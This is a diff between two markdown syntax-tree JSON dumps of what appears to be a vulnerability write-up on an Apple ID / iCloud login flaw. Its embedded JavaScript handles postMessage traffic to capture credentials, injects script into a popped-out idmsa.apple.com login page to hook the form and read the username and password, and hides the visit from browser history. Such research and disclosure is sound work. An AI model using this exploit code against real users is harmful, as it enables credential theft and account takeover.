JSONRPC protocol that apple id uses\n    // prefixes everything with this string. We need to trim\n    // it off, but also do this ourselves in our communications.\n    const prefix = \"pmrpc.\";\n\n    if (!e.data.startsWith(prefix))\n        throw new Error(`got weird message ${JSON.strigify(data)}`);\n\n    // I'm sure there's a real trimPrefix function somewhere\n    // but i'm not in the business of following the rules\n    // right now.\n    const json = e.data.slice(prefix.length);\n\n    const rq = JSON.parse(json);\n\n    // extracting the stuff from the request that will be reused\n    // for our response.\n    const { method, jsonrpc, params , id } = rq;\n\n    // share the good news when we steal your apple login\n    if (method == \"passwordAuthDone\") alert(`got creds! ${\n        JSON.stringify(params)\n    }`);\n\n    // same if we also get a 2FA'd set of creds\n    if (method == \"complete\") alert(`got creds! ${\n        JSON.stringify(params)\n    }`);\n\n    // config requests are the complicated ones.\n    // we merge our template with the jsonrpc version\n    // and the request id for our response.\n    if (method == \"config\") return nullPage.postMessage(\n        `${prefix}${JSON.stringify({\n            ...config_resp, jsonrpc, id\n        })}`, \"*\";\n    )\n\n    // for all other requests, we just let the page know\n    // that everything is OK ;)\n    nullPage.postMessage(`${prefix}${JSON.stringify({\n        jsonrpc, id, result: true\n    })}`, \"*\");\n})\n\n// prepare the config to send to the null page\nconst config = {\n    idmsaFrameId,\n    type: \"config\"\n}\n</script>",
>               "position": {
>                 "start": {
>                   "line": 1159,
>                   "column": 1,
>                   "offset": 60977
19078a21518,21818
>                 "end": {
>                   "line": 1448,
>                   "column": 4,
>                   "offset": 71486
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
19081c21821
<                   "value": ", ",
---
>                   "value": "That about covers the basics of how our vulnerability works. We need to do one more thing to truly 'steal the bank', though. We need to escape into an ",
19084,19086c21824,21826
<                       "line": 1047,
<                       "column": 114,
<                       "offset": 52811
---
>                       "line": 1450,
>                       "column": 1,
>                       "offset": 71490
19089,19091c21829,21831
<                       "line": 1047,
<                       "column": 116,
<                       "offset": 52813
---
>                       "line": 1450,
>                       "column": 152,
>                       "offset": 71641
19098c21838
<                   "value": "postMessage",
---
>                   "value": "idmsa.apple.com",
19101,19103c21841,21843
<                       "line": 1047,
<                       "column": 116,
<                       "offset": 52813
---
>                       "line": 1450,
>                       "column": 152,
>                       "offset": 71641
19106,19108c21846,21848
<                       "line": 1047,
<                       "column": 129,
<                       "offset": 52826
---
>                       "line": 1450,
>                       "column": 169,
>                       "offset": 71658
19115c21855
<                   "value": " parses out ",
---
>                   "value": " popup once our attack succeeds. Partially so it's harder to trace us, but also because having ",
19118,19120c21858,21860
<                       "line": 1047,
<                       "column": 129,
<                       "offset": 52826
---
>                       "line": 1450,
>                       "column": 169,
>                       "offset": 71658
19123,19125c21863,21865
<                       "line": 1047,
<                       "column": 141,
<                       "offset": 52838
---
>                       "line": 1450,
>                       "column": 264,
>                       "offset": 71753
19132c21872
<                   "value": "https://s3-eu-west-1.amazonaws.com",
---
>                   "value": "idmsa.apple.com",
19135,19137c21875,21877
<                       "line": 1047,
<                       "column": 141,
<                       "offset": 52838
---
>                       "line": 1450,
>                       "column": 264,
>                       "offset": 71753
19140,19142c21880,21882
<                       "line": 1047,
<                       "column": 177,
<                       "offset": 52874
---
>                       "line": 1450,
>                       "column": 281,
>                       "offset": 71770
19149c21889
<                   "value": " to be the correct target origin, which allows us to get ",
---
>                   "value": " in the url bar makes it impossible for even the most paranoid to suspect something awry. This makes our ",
19152,19154c21892,21894
<                       "line": 1047,
<                       "column": 177,
<                       "offset": 52874
---
>                       "line": 1450,
>                       "column": 281,
>                       "offset": 71770
19157,19159c21897,21899
<                       "line": 1047,
<                       "column": 234,
<                       "offset": 52931
---
>                       "line": 1450,
>                       "column": 386,
>                       "offset": 71875
19166c21906
<                   "value": "postMessage",
---
>                   "value": "injection",
19169,19171c21909,21911
<                       "line": 1047,
<                       "column": 234,
<                       "offset": 52931
---
>                       "line": 1450,
>                       "column": 386,
>                       "offset": 71875
19174,19176c21914,21916
<                       "line": 1047,
<                       "column": 247,
<                       "offset": 52944
---
>                       "line": 1450,
>                       "column": 397,
>                       "offset": 71886
19183c21923
<                   "value": "s from our embedded ",
---
>                   "value": " function a bit more complicated.",
19186,19188c21926,21928
<                       "line": 1047,
<                       "column": 247,
<                       "offset": 52944
---
>                       "line": 1450,
>                       "column": 397,
>                       "offset": 71886
19191,19193c21931,21933
<                       "line": 1047,
<                       "column": 267,
<                       "offset": 52964
---
>                       "line": 1450,
>                       "column": 430,
>                       "offset": 71919
19196a21937,21943
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1450,
>                   "column": 1,
>                   "offset": 71490
19197a21945,21955
>                 "end": {
>                   "line": 1450,
>                   "column": 430,
>                   "offset": 71919
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
19199,19200c21957,21958
<                   "type": "inlineCode",
<                   "value": "idmsa.apple.com",
---
>                   "type": "text",
>                   "value": "Warning: this code is really hacky.",
19203,19205c21961,21963
<                       "line": 1047,
<                       "column": 267,
<                       "offset": 52964
---
>                       "line": 1452,
>                       "column": 1,
>                       "offset": 71923
19208,19210c21966,21968
<                       "line": 1047,
<                       "column": 284,
<                       "offset": 52981
---
>                       "line": 1452,
>                       "column": 36,
>                       "offset": 71958
19218,19220c21976,21978
<                   "line": 1047,
<                   "column": 4,
<                   "offset": 52701
---
>                   "line": 1452,
>                   "column": 1,
>                   "offset": 71923
19223,19225c21981,21983
<                   "line": 1047,
<                   "column": 284,
<                   "offset": 52981
---
>                   "line": 1452,
>                   "column": 36,
>                   "offset": 71958
19229,20297d21986
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1047,
<               "column": 1,
<               "offset": 52698
<             },
<             "end": {
<               "line": 1047,
<               "column": 284,
<               "offset": 52981
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1041,
<           "column": 1,
<           "offset": 51718
<         },
<         "end": {
<           "line": 1047,
<           "column": 284,
<           "offset": 52981
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "What's at the end of this long road? Having tricked ",
<           "position": {
<             "start": {
<               "line": 1049,
<               "column": 1,
<               "offset": 52985
<             },
<             "end": {
<               "line": 1049,
<               "column": 53,
<               "offset": 53037
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1049,
<               "column": 53,
<               "offset": 53037
<             },
<             "end": {
<               "line": 1049,
<               "column": 70,
<               "offset": 53054
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " into thinking that we're iCloud, when you log in to our embed with your autofilled email we get an authentication for your Apple account. Even if you don't 2FA! This is because an authentication token is granted without passing 2FA for iCloud 'Find My', used for finding your potentially lost phone which you might need to pass 2FA.",
<           "position": {
<             "start": {
<               "line": 1049,
<               "column": 70,
<               "offset": 53054
<             },
<             "end": {
<               "line": 1049,
<               "column": 403,
<               "offset": 53387
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1049,
<           "column": 1,
<           "offset": 52985
<         },
<         "end": {
<           "line": 1049,
<           "column": 403,
<           "offset": 53387
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We've compromised the trust between ",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 1,
<               "offset": 53391
<             },
<             "end": {
<               "line": 1051,
<               "column": 37,
<               "offset": 53427
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 37,
<               "offset": 53427
<             },
<             "end": {
<               "line": 1051,
<               "column": 54,
<               "offset": 53444
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and iCloud. But there's more to do here. What if we could take over ",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 54,
<               "offset": 53444
<             },
<             "end": {
<               "line": 1051,
<               "column": 123,
<               "offset": 53513
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 123,
<               "offset": 53513
<             },
<             "end": {
<               "line": 1051,
<               "column": 140,
<               "offset": 53530
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " in the user's client? As gullible as users are, our browser doesn't currently show ",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 140,
<               "offset": 53530
<             },
<             "end": {
<               "line": 1051,
<               "column": 224,
<               "offset": 53614
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "apple.com",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 224,
<               "offset": 53614
<             },
<             "end": {
<               "line": 1051,
<               "column": 235,
<               "offset": 53625
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " in the address bar. We can't popout the Apple ID login window, because the postMessage code specifically refers to ",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 235,
<               "offset": 53625
<             },
<             "end": {
<               "line": 1051,
<               "column": 351,
<               "offset": 53741
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.parent",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 351,
<               "offset": 53741
<             },
<             "end": {
<               "line": 1051,
<               "column": 366,
<               "offset": 53756
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", rather than ",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 366,
<               "offset": 53756
<             },
<             "end": {
<               "line": 1051,
<               "column": 380,
<               "offset": 53770
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.opener",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 380,
<               "offset": 53770
<             },
<             "end": {
<               "line": 1051,
<               "column": 395,
<               "offset": 53785
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 1051,
<               "column": 395,
<               "offset": 53785
<             },
<             "end": {
<               "line": 1051,
<               "column": 396,
<               "offset": 53786
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1051,
<           "column": 1,
<           "offset": 53391
<         },
<         "end": {
<           "line": 1051,
<           "column": 396,
<           "offset": 53786
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If we manage to get XSS from the position we're in now, we could open a popup from our compromised, embedded page into a 'real' ",
<           "position": {
<             "start": {
<               "line": 1053,
<               "column": 1,
<               "offset": 53790
<             },
<             "end": {
<               "line": 1053,
<               "column": 129,
<               "offset": 53918
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1053,
<               "column": 129,
<               "offset": 53918
<             },
<             "end": {
<               "line": 1053,
<               "column": 146,
<               "offset": 53935
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " page, and attack the popup from our embedded window. Once we've taken over the popup, we can use ",
<           "position": {
<             "start": {
<               "line": 1053,
<               "column": 146,
<               "offset": 53935
<             },
<             "end": {
<               "line": 1053,
<               "column": 244,
<               "offset": 54033
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.location.assign('https://apple.com')",
<           "position": {
<             "start": {
<               "line": 1053,
<               "column": 244,
<               "offset": 54033
<             },
<             "end": {
<               "line": 1053,
<               "column": 289,
<               "offset": 54078
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " to destroy our entry in the user history so it's not possible for the user to see that they were ever on a non-apple website.",
<           "position": {
<             "start": {
<               "line": 1053,
<               "column": 289,
<               "offset": 54078
<             },
<             "end": {
<               "line": 1053,
<               "column": 415,
<               "offset": 54204
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1053,
<           "column": 1,
<           "offset": 53790
<         },
<         "end": {
<           "line": 1053,
<           "column": 415,
<           "offset": 54204
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "Stealing the Bank From an ATM",
<           "position": {
<             "start": {
<               "line": 1055,
<               "column": 1,
<               "offset": 54208
<             },
<             "end": {
<               "line": 1055,
<               "column": 30,
<               "offset": 54237
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1055,
<           "column": 1,
<           "offset": 54208
<         },
<         "end": {
<           "line": 1056,
<           "column": 30,
<           "offset": 54268
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "stealing the bank from an atm",
<       "label": "Stealing the Bank From an ATM",
<       "title": null,
<       "url": "#stealing-the-bank-from-an-atm",
<       "position": {
<         "start": {
<           "line": 1057,
<           "column": 1,
<           "offset": 54270
<         },
<         "end": {
<           "line": 1057,
<           "column": 64,
<           "offset": 54333
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§9",
<       "label": "§9",
<       "title": null,
<       "url": "#stealing-the-bank-from-an-atm",
<       "position": {
<         "start": {
<           "line": 1058,
<           "column": 1,
<           "offset": 54335
<         },
<         "end": {
<           "line": 1058,
<           "column": 37,
<           "offset": 54371
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Getting ",
<           "position": {
<             "start": {
<               "line": 1060,
<               "column": 1,
<               "offset": 54375
<             },
<             "end": {
<               "line": 1060,
<               "column": 9,
<               "offset": 54383
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1060,
<               "column": 9,
<               "offset": 54383
<             },
<             "end": {
<               "line": 1060,
<               "column": 26,
<               "offset": 54400
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " XSS turned out way, way easier than expected, probably due to the position of leverage we find ourselves in. Apple ID already thinks we're a first party Apple app, and gives us ridiculously free control over how we display the login dialog.",
<           "position": {
<             "start": {
<               "line": 1060,
<               "column": 26,
<               "offset": 54400
<             },
<             "end": {
<               "line": 1060,
<               "column": 267,
<               "offset": 54641
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1060,
<           "column": 1,
<           "offset": 54375
<         },
<         "end": {
<           "line": 1060,
<           "column": 267,
<           "offset": 54641
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Take a look at the configuration that iCloud sends to Apple ID to request a specific login display:",
<           "position": {
<             "start": {
<               "line": 1062,
<               "column": 1,
<               "offset": 54645
<             },
<             "end": {
<               "line": 1062,
<               "column": 100,
<               "offset": 54744
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1062,
<           "column": 1,
<           "offset": 54645
<         },
<         "end": {
<           "line": 1062,
<           "column": 100,
<           "offset": 54744
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "json",
<       "meta": null,
<       "value": "parent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\",\"result\":{\"data\":{\"features\":{\"rememberMe\":true,\"createLink\":false,\"iForgotLink\":true,\"pause2FA\":false},\"signInLabel\":\"Sign in to iCloud\",\"serviceKey\":\"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\",\"defaultAccountNameAutoFillDomain\":\"icloud.com\",\"trustTokens\":[\"HSARMTnl/S90E=SRVX\"],\"rememberMeLabel\":\"keep-me-signed-in\",\"theme\":\"dark\",\"waitAnimationOnAuthComplete\":false,\"logo\":{\"src\":\"data:image/png;base64,[ ... ]ErkJggg==\",\"width\":\"100px\"}}}}",
<       "position": {
<         "start": {
<           "line": 1064,
<           "column": 1,
<           "offset": 54748
<         },
<         "end": {
<           "line": 1066,
<           "column": 4,
<           "offset": 55303
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "There's a few configs that are just toggles, like ",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 1,
<               "offset": 55307
<             },
<             "end": {
<               "line": 1068,
<               "column": 51,
<               "offset": 55357
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "rememberMe",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 51,
<               "offset": 55357
<             },
<             "end": {
<               "line": 1068,
<               "column": 63,
<               "offset": 55369
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", ",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 63,
<               "offset": 55369
<             },
<             "end": {
<               "line": 1068,
<               "column": 65,
<               "offset": 55371
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "createLink",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 65,
<               "offset": 55371
<             },
<             "end": {
<               "line": 1068,
<               "column": 77,
<               "offset": 55383
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and ",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 77,
<               "offset": 55383
<             },
<             "end": {
<               "line": 1068,
<               "column": 82,
<               "offset": 55388
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "iForgotLink",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 82,
<               "offset": 55388
<             },
<             "end": {
<               "line": 1068,
<               "column": 95,
<               "offset": 55401
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". ",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 95,
<               "offset": 55401
<             },
<             "end": {
<               "line": 1068,
<               "column": 97,
<               "offset": 55403
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "pause2FA",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 97,
<               "offset": 55403
<             },
<             "end": {
<               "line": 1068,
<               "column": 107,
<               "offset": 55413
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is probably the one that 'Find My' uses to defer 2FA until after the user has found their lost iPhone.",
<           "position": {
<             "start": {
<               "line": 1068,
<               "column": 107,
<               "offset": 55413
<             },
<             "end": {
<               "line": 1068,
<               "column": 210,
<               "offset": 55516
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1068,
<           "column": 1,
<           "offset": 55307
<         },
<         "end": {
<           "line": 1068,
<           "column": 210,
<           "offset": 55516
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "But we have much freer inputs for ",
<           "position": {
<             "start": {
<               "line": 1070,
<               "column": 1,
<               "offset": 55520
<             },
<             "end": {
<               "line": 1070,
<               "column": 35,
<               "offset": 55554
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "signInLabel",
<           "position": {
<             "start": {
<               "line": 1070,
<               "column": 35,
<               "offset": 55554
<             },
<             "end": {
<               "line": 1070,
<               "column": 48,
<               "offset": 55567
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and ",
<           "position": {
<             "start": {
<               "line": 1070,
<               "column": 48,
<               "offset": 55567
<             },
<             "end": {
<               "line": 1070,
<               "column": 53,
<               "offset": 55572
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "logo.src",
<           "position": {
<             "start": {
<               "line": 1070,
<               "column": 53,
<               "offset": 55572
<             },
<             "end": {
<               "line": 1070,
<               "column": 63,
<               "offset": 55582
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". ",
<           "position": {
<             "start": {
<               "line": 1070,
<               "column": 63,
<               "offset": 55582
<             },
<             "end": {
<               "line": 1070,
<               "column": 65,
<               "offset": 55584
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "theme",
<           "position": {
<             "start": {
<               "line": 1070,
<               "column": 65,
<               "offset": 55584
<             },
<             "end": {
<               "line": 1070,
<               "column": 72,
<               "offset": 55591
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " also implies to me there might be a possible CSS injection as the 'dark' theme no doubt is a CSS class. ",
<           "position": {
<             "start": {
<               "line": 1070,
<               "column": 72,
<               "offset": 55591
<             },
<             "end": {
<               "line": 1070,
<               "column": 177,
<               "offset": 55696
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1070,
<           "column": 1,
<           "offset": 55520
<         },
<         "end": {
<           "line": 1070,
<           "column": 177,
<           "offset": 55696
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "From Chrome Developer Tools, we can search all the recursive assets acquired by the login system as it loads. This should make it pretty easy to find out how these are sanitized and loaded into the page.",
<           "position": {
<             "start": {
<               "line": 1072,
<               "column": 1,
<               "offset": 55700
<             },
<             "end": {
<               "line": 1072,
<               "column": 204,
<               "offset": 55903
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1072,
<           "column": 1,
<           "offset": 55700
<         },
<         "end": {
<           "line": 1072,
<           "column": 204,
<           "offset": 55903
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "There's a few hits for 'signInLabel', but this is the one that stands out most to me:",
<           "position": {
<             "start": {
<               "line": 1074,
<               "column": 1,
<               "offset": 55907
<             },
<             "end": {
<               "line": 1074,
<               "column": 86,
<               "offset": 55992
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1074,
<           "column": 1,
<           "offset": 55907
<         },
<         "end": {
<           "line": 1074,
<           "column": 86,
<           "offset": 55992
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "d()(w.a, \"envConfigFromConsumer.signInLabel\", \"\").trim() && n.attr(\"signInLabel\", w.a.envConfigFromConsumer.signInLabel),",
<       "position": {
<         "start": {
<           "line": 1076,
<           "column": 1,
<           "offset": 55996
<         },
<         "end": {
<           "line": 1078,
<           "column": 4,
<           "offset": 56137
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "It looks like when the config is sent, it gets assigned to ",
<           "position": {
<             "start": {
<               "line": 1080,
<               "column": 1,
<               "offset": 56141
<             },
<             "end": {
<               "line": 1080,
<               "column": 60,
<               "offset": 56200
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "envConfigFromConsumer",
<           "position": {
<             "start": {
<               "line": 1080,
<               "column": 60,
<               "offset": 56200
<             },
<             "end": {
<               "line": 1080,
<               "column": 83,
<               "offset": 56223
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". If we look for that, we should be able to find a bunch of configuration options that they ",
<           "position": {
<             "start": {
<               "line": 1080,
<               "column": 83,
<               "offset": 56223
<             },
<             "end": {
<               "line": 1080,
<               "column": 175,
<               "offset": 56315
20299,20304d21987
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
20306,20307c21989,21992
<               "type": "text",
<               "value": "don't",
---
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "const injection = () => {\n\n    // we want to get rid of the evidence as soon as we can.\n    // once our popup is initialized, it passes us a message\n    // which we then pass onto our parent exploit window.\n    // it can then use location.assign() to remove us\n    // from the browser history.\n    window.addEventListener(\"message\", ({data}) => {\n    if(data != \"CLOSE\") return;\n        window.parent.postMessage(\"CLOSE\", \"*\");\n        window.close();\n    })\n\n\n    // the 'Sign in With Apple' button, stolen right from\n    // the brand guidelines\n    const appleLoginImage = \"https://developer.apple.com/design/human-interface-guidelines/sign-in-with-apple/images/apple-id-sign-in-with.png\";\n\n    // This is a legitimate apple login page.\n    // we pop this out and escape into it.\n    const legitLogin = \"https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=49bd208126787c17c33ca3b14d2a4f0c92daa10c417c4d686140e4acc04ba5f4&language=US-EN&path=/Login.do%3FmyInfoReturnURL%3DRegisterAgreement.do%253Fskip%253Dyes%253Fskip%253Dyes\";\n\n    // create the 'Signi in With Apple' button.\n    const i = document.createElement(\"img\");\n    i.src= appleLoginImage;\n\n    // when the button is clicked, we popout our\n    // 'legit' login page.\n    //\n    // A click is needed due to anti-popup browser measures.\n    // we could equally use another input like pressing a key,\n    // but this I think arouses the least suspiscion.\n    i.addEventListener('click', () => {\n    const myWnd = window.open(legitLogin);\n\n    // once we've opened the legit login page, we won't\n    // know when it's actually ready to inject into.\n    // so we just keep injecting over and over again\n    // every tenth of a second until we get a signal\n    // back to say the injection succeedd.\n    setInterval(() => {\n        // injecting code across windows and origins like this\n        // is *really* annoying. unless you've done it before\n        // the full scope of annoyance will be blissfully unknown\n        // to you.\n        //\n        // Because of the way Javascript internals work, each `window`\n        // is its own namespace, so when we document.createElement --\n        // which is secretly window.document.createElement,\n        // we actually make an element that's specific to our\n        // window.\n        //\n        // This fuckery is beyond us at this point\n        // so it's easiest to just inject scripts and have\n        // them run natively in the attacked window.\n        const toInject = () => {\n        \n        // A nice little touch :)\n        document.querySelector(\"#signin\").innerHTML = document.querySelector(\"#signin\").innerHTML.replace(/Apple Support/g, \"your free iPhone\");\n        document.querySelector(\"form[name=form1]\").setAttribute(\"onsubmit\", \"\");\n\n        // override the submit action for the form\n        // to steal the user's username and password.\n        document.querySelector(\"form[name=form1]\").addEventListener('submit',() => {\n            alert(`${\n            document.querySelector(\"#accountname\").value\n            } / ${\n            